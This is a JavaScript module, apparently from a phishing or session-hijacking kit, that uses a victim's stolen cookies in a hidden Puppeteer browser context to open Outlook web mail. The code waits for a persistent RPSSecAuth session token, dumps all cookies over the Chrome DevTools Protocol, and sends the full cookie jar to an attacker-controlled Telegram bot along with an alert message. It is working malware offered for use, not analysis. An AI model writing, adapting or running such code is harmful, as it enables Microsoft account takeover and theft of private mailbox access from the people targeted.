const axios = require('axios');
const FormData = require('form-data');

/**
 * PROWLER MODULE (2026 Standard)
 * Independent background worker to force-mint $RPSSecAuth$
 */
async function triggerProwler(browser, tier1Cookies, vault) {
    console.log("[PROWLER] Identity detected. Spawning Ghost Context...");

    // Independent context avoids interference with the victim's active tab
    const context = await browser.createBrowserContext();
    const page = await context.newPage();
    const cdp = await page.target().createCDPSession();

    try {
        await page.setCookie(...tier1Cookies);
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36');

        // Force a direct jump to the mailbox to trigger the handshake
        const mailboxUrl = "https://outlook.office.com/owa/?nlp=1"; 
        
        await page.goto(mailboxUrl, { 
            waitUntil: 'networkidle2', 
            timeout: 45000 
        });

        // "Maturity Delay" - 8 seconds for the server to issue persistence tokens
        await new Promise(r => setTimeout(r, 8000));

        // Global memory dump via CDP
        const { cookies } = await cdp.send('Network.getAllCookies');
        const hasRPS = cookies.some(c => c.name === 'RPSSecAuth');

        if (hasRPS) {
            console.log("[PROWLER] 🎯 RPSSecAuth Recovered successfully.");
            await reportFinalJar(cookies, vault);
        } else {
            console.log("[PROWLER] ⚠️ Visit complete, but RPS token not issued.");
        }

    } catch (err) {
        console.log("[PROWLER] Background error (ignored): ", err.message);
    } finally {
        await context.close(); 
    }
}

async function reportFinalJar(cookies, creds) {
    try {
        const form = new FormData();
        form.append('chat_id', creds.TG_CHAT_ID);
        form.append('document', Buffer.from(JSON.stringify(cookies, null, 2)), {
            filename: `🏆_FULL_PERSISTENT_JAR.json`,
            contentType: 'application/json'
        });

        await axios.post(`https://api.telegram.org/bot${creds.TG_TOKEN}/sendDocument`, form, {
            headers: form.getHeaders()
        });
        
        await axios.post(`https://api.telegram.org/bot${creds.TG_TOKEN}/sendMessage`, {
            chat_id: creds.TG_CHAT_ID,
            text: `<b>🚨 TIER 2: PERSISTENCE RECOVERED</b>\nGhost Prowler successfully minted the mailbox session keys.`,
            parse_mode: 'HTML'
        });
    } catch (e) { console.log("[PROWLER] Telegram delivery failure."); }
}

module.exports = { triggerProwler };
